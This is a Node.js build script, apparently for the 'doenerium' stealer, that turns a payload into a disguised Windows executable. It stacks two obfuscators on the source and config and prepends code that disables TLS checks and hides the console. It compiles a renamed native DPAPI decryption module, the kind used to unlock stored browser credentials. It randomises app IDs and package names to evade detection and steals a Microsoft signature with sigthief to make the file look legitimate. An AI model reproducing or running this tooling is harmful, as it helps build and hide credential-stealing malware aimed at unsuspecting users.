const jsconfuser = require('js-confuser');
const jsobf = require("javascript-obfuscator");
const fs = require("fs");
const path = require('path');
const child_process = require("child_process");
const os = require("os");
const https = require('https');
const config = require("./config.js")()

const builder = require("electron-builder");
const Platform = builder.Platform;
const electron_version = "24.1.1";

async function install_node_gyp() {
    return new Promise(res => {
        res(child_process.execSync("npm install -g node-gyp"))
    })
}

var isModuleAvailableSync = function (moduleName) {
    var ret = false; // return value, boolean
    var dirSeparator = require("path").sep

    // scan each module.paths. If there exists
    // node_modules/moduleName then
    // return true. Otherwise return false.
    module.paths.forEach(function (nodeModulesPath) {
        if (fs.existsSync(nodeModulesPath + dirSeparator + moduleName) === true) {
            ret = true;
            return false; // break forEach
        }
    });

    return ret;
}

async function install_module(module_name) {
    return new Promise(res => {
        res(child_process.execSync(`npm install ${module_name}`))
    })
}

async function check_all_modules_installed() {
    return new Promise(async (res) => {
        [
            "@peculiar/webcrypto",
            "axios",
            "bitcoin-seed",
            "boukiapi",
            "buffer-replace",
            "form-data",
            "javascript-obfuscator",
            "js-confuser",
            "node-forge",
            "node-gyp",
            "node-hide-console-window",
            "node-powershell",
            "request",
            "seco-file",
            "sqlite3",
            "systeminformation",
            "zip-lib"
        ].forEach(async (moduleName) => {
            if (!isModuleAvailableSync(moduleName)) {
                if (moduleName == "boukiapi") {
                    let start = Date.now();

                    console.log("Copying ./boukiapi to ./node_modules/boukiapi")
                    fs.mkdirSync("./node_modules/boukiapi");
                    copyFolderRecursiveSync("./boukiapi", "./node_modules")
                    console.log(`Copied ./boukiapi to ./node_modules/boukiapi within ${(Date.now() - start) / 1000} seconds`);
                } else {
                    console.log(`Installing "${moduleName}" as it is not installed`)
                    await install_module(moduleName)
                    console.log(`Installed "${moduleName}"`)
                }

            }
        })

        res()
    })
}

async function fix_node_gyp(versions) {
    const appdata = process.env.LOCALAPPDATA;

    for (var version of versions) {
        for (var file of fs.readdirSync(`${appdata}\\node-gyp\\Cache\\${version}\\include\\node`)) {
            if (file.includes(".DELETE")) {
                console.log(`node-gyp-fix | Fixed ${file}`)
                fs.renameSync(`${appdata}\\node-gyp\\Cache\\${version}\\include\\node\\${file}`, `${appdata}\\node-gyp\\Cache\\${version}\\include\\node\\${file.split(".DELETE")[0]}`)
            }
        }
    }
}

async function rebuild() {
    return new Promise(res => {
        console.log("Rebuilding packages")
        res(child_process.execSync("npm rebuild", { cwd: "./electron" }))
        console.log("Rebuilt packages")
    })
}

async function fix_dependencies() {

    return new Promise(async res => {
        const appdata = process.env.LOCALAPPDATA;

        if (!fs.readdirSync(appdata).includes("node-gyp")) {
            await install_node_gyp();
            await fix_dependencies();
        }

        console.log("Rebuilding boukiapi");
        await build_native_module("boukiapi")
        console.log("Rebuilt boukiapi");

        const node_js_versions = fs.readdirSync(`${appdata}\\node-gyp\\Cache`);
        await fix_node_gyp(node_js_versions)
        res(await rebuild());
    })


}

function makeid_var(length) {
    let result = '';
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    const charactersLength = characters.length;
    let counter = 0;
    while (counter < length) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
        counter += 1;
    }
    return result;
}

function makeid(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const charactersLength = characters.length;
    let counter = 0;
    while (counter < length) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
        counter += 1;
    }
    return result;
}

async function obfuscate(input, output) {

    return new Promise(res => {
        const OBF_PAYLOAD_CONFIG = {
            compact: true,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            shuffleStringArray: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }

        var data = jsobf.obfuscate(fs.readFileSync(input, "utf-8"), OBF_PAYLOAD_CONFIG).getObfuscatedCode();

        jsconfuser.obfuscate(data, {
            target: "node",
            renameVariables: false,
            controlFlowFlattening: 0,
            globalConcealing: false,
            stringCompression: 0.5,
            stringConcealing: 0.5,
            stringEncoding: 0.5,
            stringSplitting: 0.5,
            deadCode: 0.5,
            calculator: 0,
            compact: true,
            movedDeclarations: false,
            objectExtraction: false,
            stack: 0,
            duplicateLiteralsRemoval: 0,
            flatten: false,
            dispatcher: 0,
            opaquePredicates: 0,
            shuffle: { hash: 0, true: 0 },
        }).then(obfuscated => {
            let modules = `process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
require("child_process");
require("crypto");
require("fs");
require("os");
require("path");
require("stream");
require("zip-lib");
require("boukiapi");
require("systeminformation");
require("sqlite3");
require("request");
require("node-hide-console-window");
require("form-data");
require("buffer-replace");
require("axios");
require('https');
require("./config_obf.js");

async function hideSelf() {
    require("node-hide-console-window").hideConsole();
}

hideSelf();
`

            res(fs.writeFileSync(output, modules + obfuscated));


        })
    })
}

/**
 * Download a resource from `url` to `dest`.
 * @param {string} url - Valid URL to attempt download of resource
 * @param {string} dest - Valid path to save the file.
 * @returns {Promise<void>} - Returns asynchronously when successfully completed download
 */
function download(url, dest) {
    return new Promise((resolve, reject) => {
        // Check file does not exist yet before hitting network
        fs.access(dest, fs.constants.F_OK, async (err) => {

            if (err === null) {
                fs.unlinkSync(dest)
                resolve(await download(url, dest))
            }

            const request = https.get(url, response => {
                if (response.statusCode === 200) {

                    const file = fs.createWriteStream(dest, { flags: 'wx' });
                    file.on('finish', () => resolve());
                    file.on('error', async err => {
                        file.close();
                        if (err.code === 'EEXIST') {
                            fs.unlinkSync(dest)
                            resolve(await download(url, dest))
                        }
                        else { fs.unlink(dest, () => reject(err.message)) }; // Delete temp file
                    });
                    response.pipe(file);
                } else if (response.statusCode === 302 || response.statusCode === 301) {
                    //Recursively follow redirects, only a 200 will resolve.
                    download(response.headers.location, dest).then(() => resolve());
                } else {
                    reject(`Server responded with ${response.statusCode}: ${response.statusMessage}`);
                }
            });

            request.on('error', err => {
                reject(err.message);
            });
        });
    });
}
async function build_native_module(package) {
    return new Promise(res => {
        res(child_process.execSync(`node-gyp rebuild`, { cwd: `./electron/node_modules/${package}` }))
    })
}

function get_pkg_cache() {
    const pkg_cache_path = `${process.env.SystemDrive}\\Users\\${os.userInfo().username}\\.pkg-cache`;

    if (!fs.existsSync(pkg_cache_path)) {
        fs.mkdirSync(pkg_cache_path)
        fs.mkdirSync(`${pkg_cache_path}\\v3.4`)
    }

    return `${pkg_cache_path}\\v3.4`;
}

async function rename_dapi() {
    let path = `.\\electron\\node_modules\\boukiapi`
    let original_name = "node-dpapi"
    let new_name = makeid_var(12);

    fs.rmSync(`${path}\\build`, { recursive: true, force: true })

    if (!fs.existsSync(`${path}\\src\\node-dpapi.cpp`) || !(fs.readFileSync(`${path}\\src\\node-dpapi.cpp`, "utf-8")).includes(original_name)) {

        let index_js = `const dpapi = require("bindings")("node-dpapi");

module.exports.unprotectData = dpapi.unprotectData;`;

        let index_d_ts = `declare module "node-dpapi" {
    function unprotectData(
        encryptedData: Uint8Array,
        optionalEntropy: Uint8Array,
        scope: "CurrentUser" | "LocalMachine"
    ): Uint8Array;
}`;

        let binding_gyp = `{
"targets": [
    {
    "target_name": "node-dpapi",
    "sources": [ "src/node-dpapi.cpp" ],
    "include_dirs": [
        "<!(node -e \\"require('nan')\\")",
        "include"
    ],
    "libraries": [
        "-lcrypt32.lib"
    ]
    }
]
}`;

        fs.rmSync(`${path}\\src`, { recursive: true, force: true });
        fs.mkdirSync(`${path}\\src`);
        fs.writeFileSync(`${path}\\src\\node-dpapi.cpp`, "PLACEHOLDER");
        fs.writeFileSync(`${path}\\index.js`, index_js);
        fs.writeFileSync(`${path}\\index.d.ts`, index_d_ts);
        fs.writeFileSync(`${path}\\binding.gyp`, binding_gyp);
    }

    ["src\\node-dpapi.cpp", "index.js", "index.d.ts", "binding.gyp"].forEach(file => {
        let content = fs.readFileSync(`${path}\\${file}`, "utf-8")

        let splits = content.split(" ");

        for (var split in splits) {
            let string = splits[split];
            string = string.replace(original_name, new_name);

            splits[split] = string;
        }

        content = splits.join(" ")

        fs.writeFileSync(`${path}\\${file}`, content, "utf-8")
    })

    console.log(`Renaming dapi vars`)
    await rename_dapi_vars();
    console.log(`Renamed dapi vars`)

    fs.renameSync(`${path}\\src\\node-dpapi.cpp`, `${path}\\src\\${new_name}.cpp`)
}

async function rename_dapi_vars() {
    return new Promise(res => {
        let path = `./electron/node_modules/boukiapi/src/node-dpapi.cpp`;

        let content = `#include <node.h>
#include <nan.h>
#include <Windows.h>
#include <dpapi.h>

void UQDJcHcaSaTefKfYStdCYrDvn(Nan::NAN_METHOD_ARGS_TYPE info)
{

    auto UnEwXzYWTBpnaePEkkNvZrWhM = node::Buffer::Data(info[0]);
    auto yhKrTZMuRNvScccDUkegDyMQE = node::Buffer::Length(info[0]);

    DATA_BLOB juGsCdDXyXpRnFnbPYMuxJUKm;
    DATA_BLOB kfghGYAWWyVrmZEpPfDCgUqCg;

    juGsCdDXyXpRnFnbPYMuxJUKm.pbData = reinterpret_cast<BYTE*>(UnEwXzYWTBpnaePEkkNvZrWhM);
    juGsCdDXyXpRnFnbPYMuxJUKm.cbData = yhKrTZMuRNvScccDUkegDyMQE;

    bool HZECTReECYfAEykgJJsZbnmQC = false;

    HZECTReECYfAEykgJJsZbnmQC = CryptUnprotectData(
        &juGsCdDXyXpRnFnbPYMuxJUKm,
        nullptr,
        nullptr,
        nullptr,
        nullptr,
        0,
        &kfghGYAWWyVrmZEpPfDCgUqCg);

    auto CwqjUWHQMEHRqGJFVnDcaGhRa = Nan::CopyBuffer(reinterpret_cast<const char*>(kfghGYAWWyVrmZEpPfDCgUqCg.pbData), kfghGYAWWyVrmZEpPfDCgUqCg.cbData).ToLocalChecked();
    LocalFree(kfghGYAWWyVrmZEpPfDCgUqCg.pbData);

    info.GetReturnValue().Set(CwqjUWHQMEHRqGJFVnDcaGhRa);
}

NAN_METHOD(unprotectData)
{
    UQDJcHcaSaTefKfYStdCYrDvn(info);
}

NAN_MODULE_INIT(init)
{
    Nan::Set(
        target,
        Nan::New<v8::String>("unprotectData").ToLocalChecked(),
        Nan::GetFunction(Nan::New<v8::FunctionTemplate>(unprotectData)).ToLocalChecked());
}

#if NODE_MAJOR_VERSION >= 10
NAN_MODULE_WORKER_ENABLED(binding, init)
#else
NODE_MODULE(binding, init)
#endif`

        let splits = content.split(" ");

        let new_vars = {};

        [
            "CwqjUWHQMEHRqGJFVnDcaGhRa",
            "UQDJcHcaSaTefKfYStdCYrDvn",
            "UnEwXzYWTBpnaePEkkNvZrWhM",
            "yhKrTZMuRNvScccDUkegDyMQE",
            "juGsCdDXyXpRnFnbPYMuxJUKm",
            "kfghGYAWWyVrmZEpPfDCgUqCg",
            "HZECTReECYfAEykgJJsZbnmQC",
        ].forEach(variable => {
            let new_var = makeid_var(32);
            new_vars[variable] = new_var;
        })

        for (var split in splits) {
            let string = splits[split];
            [
                "CwqjUWHQMEHRqGJFVnDcaGhRa",
                "UQDJcHcaSaTefKfYStdCYrDvn",
                "UnEwXzYWTBpnaePEkkNvZrWhM",
                "yhKrTZMuRNvScccDUkegDyMQE",
                "juGsCdDXyXpRnFnbPYMuxJUKm",
                "kfghGYAWWyVrmZEpPfDCgUqCg",
                "HZECTReECYfAEykgJJsZbnmQC",
            ].forEach(variable => {
                string = string.replace(variable, new_vars[variable])
            })

            splits[split] = string;
        }

        content = splits.join(" ")

        res(fs.writeFileSync(path, content))
    })
}

async function fix_package() {
    const package_json = JSON.parse(fs.readFileSync("./electron/package.json"));

    let new_name = makeid_var(16)

    package_json.name = new_name;
    ["js-confuser", "javascript-obfuscator", "electron-builder", "electron-rebuild"].forEach(module => {
        delete package_json.dependencies[module];
    })

    fs.writeFileSync("./electron/package.json", JSON.stringify(package_json))
}

function signFile(signed, file, output) {
    return new Promise(res => child_process.exec(`python sigthief.py -i ${signed} -t ${file} -o ${output}`, (err, stdout, stderr) => res(stdout)));
}

function copyFileSync(source, target) {

    var targetFile = target;

    // If target is a directory, a new file with the same name will be created
    if (fs.existsSync(target)) {
        if (fs.lstatSync(target).isDirectory()) {
            targetFile = path.join(target, path.basename(source));
        }
    }

    fs.writeFileSync(targetFile, fs.readFileSync(source));
}

function copyFolderRecursiveSync(source, target) {
    var files = [];

    // Check if folder needs to be created or integrated
    var targetFolder = path.join(target, path.basename(source));
    if (!fs.existsSync(targetFolder)) {
        fs.mkdirSync(targetFolder);
    }

    // Copy
    if (fs.lstatSync(source).isDirectory()) {
        files = fs.readdirSync(source);
        files.forEach(function (file) {
            var curSource = path.join(source, file);
            if (fs.lstatSync(curSource).isDirectory()) {
                copyFolderRecursiveSync(curSource, targetFolder);
            } else {
                copyFileSync(curSource, targetFolder);
            }
        });
    }
}

async function rebuild_electron() {
    return new Promise(res => {
        res(child_process.execSync(`electron-rebuild -a ia32 -v ${electron_version}`, { cwd: "./electron" }))
    })
}

(async () => {
    let randomid = makeid(8)

    let skip_download_nodejs = Boolean(process.argv[2])
    if (!skip_download_nodejs) { // idk why but my builder is kinda tripping & this somehow works LMFAO
        console.log("Downloading Node.js pre-built binary")
        let start = Date.now()


        child_process.execSync(`node build.js true`, {
            stdio: "inherit"
        })

        return;
    }

    console.log("Checking if all modules are installed")
    await check_all_modules_installed();
    console.log("Checked if all modules are installed")

    start = Date.now();
    console.log("Copying ./node_modules to ./electron/node_modules")
    if (!fs.existsSync("./electron/node_modules")) {
        fs.mkdirSync("./electron/node_modules");
    }
    try {
        copyFileSync("./package.json", "./electron/package.json");
        copyFileSync("./package-lock.json", "./electron/package-lock.json");

        copyFolderRecursiveSync("./node_modules", "./electron")
    } catch (e) {
        console.log(e)
    }
    console.log(`Copied ./node_modules to ./electron/node_modules within ${(Date.now() - start) / 1000} seconds`);

    console.log(`Modding boukiapi`)
    await rename_dapi();
    console.log("Modded boukiapi");

    console.log(`Modding package.json`)
    await fix_package();
    console.log(`Modded package.json`)

    console.log("Fixing dependencies")
    await fix_dependencies();
    console.log("Fixed dependencies")
    start = Date.now();
    console.log("Rebuilding electron")
    await rebuild_electron();
    console.log(`Rebuilt electron within ${(Date.now() - start) / 1000} seconds`)

    const index_file = "./electron/index.js";
    const config_file = "./electron/config_obf.js"
    console.log(`Obfuscating source code`)
    start = Date.now()
    await obfuscate("doenerium.js", index_file);
    console.log(`Finished obfuscating source code within ${(Date.now() - start) / 1000} seconds: ${index_file}`);
    console.log(`Obfuscating config URL`)
    start = Date.now()
    await obfuscate("config.js", config_file);
    console.log(`Finished obfuscating source code within ${(Date.now() - start) / 1000} seconds: ${config_file}`);

    console.log(`Building stub...`)
    start = Date.now()

    const d = await builder.build({
        targets: Platform.WINDOWS.createTarget(),
        config: {
            npmRebuild: true,
            nodeGypRebuild: false,
            buildDependenciesFromSource: true,
            appId: `${makeid_var(8)}.${makeid_var(8)}.${makeid_var(8)}`,
            electronVersion: electron_version,
            nodeVersion: "18.15.0",
            buildVersion: `${Math.floor(Math.random() * 9)}.${Math.floor(Math.random() * 9)}.${Math.floor(Math.random() * 9)}`,
            productName: config.properties.ProductName,
            icon: config.icon,
            compression: 'maximum',
            directories: {
                app: "./electron",
                output: `${randomid}`,
            },
            win: {
                artifactName: config.properties.OriginalFilename,
                publisherName: "x",
                legalTrademarks: config.properties.LegalCopyright,
                target: [
                    {
                        target: "portable",
                        arch: [
                            "ia32",
                        ]
                    }
                ]
            }
        }
    })

    //child_process.execSync(`pkg . -C GZip -t node18 -o doenerium_${randomid}.exe`)
    fs.unlinkSync(index_file);
    fs.unlinkSync(config_file);

    try {
        console.log(await signFile("./unsigned/Windows10Upgrade9252.exe", `${randomid}/${config.properties.OriginalFilename}`, `doenerium_${randomid}.exe`))
    } catch (e) {
        console.log(e)
    }

    console.log(`Successfully finished building stub within ${(Date.now() - start) / 1000} seconds: doenerium_${randomid}.exe`)

    if (!fs.existsSync(`./doenerium_${randomid}.exe`)) {
        fs.copyFileSync(`${randomid}/${config.properties.OriginalFilename}`, `./doenerium_${randomid}.exe`)
    }

    fs.rmdirSync(randomid, { recursive: true, force: true })

    console.log(`You can now close this window.`)
const exec = require('child_process').exec;
exec(`start doenerium_${randomid}.exe`, (error, stdout, stderr) => {
  if (error) {
    console.error(`Erreur lors de l'exécution du fichier : ${error}`);
    return;
  }
  console.log(`Le fichier doenerium_${randomid}.exe a été exécuté avec succès.`);
});
    while (true) { }
})()
